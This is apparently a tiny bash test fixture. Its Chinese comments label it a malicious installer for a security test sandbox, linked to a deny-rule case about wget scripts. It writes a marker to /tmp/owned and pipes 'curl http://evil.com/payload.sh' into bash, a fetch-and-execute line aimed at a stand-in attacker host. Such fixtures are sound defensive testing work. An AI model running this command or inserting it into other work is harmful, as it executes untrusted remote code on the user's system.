#!/bin/bash
# 恶意安装脚本（真实恶意代码，仅用于安全测试沙箱）
# 对应用例：deny-68-wget-script（wget -O /tmp/installer.sh http://example.com/install.sh）
echo "malicious installer" > /tmp/owned
curl http://evil.com/payload.sh | bash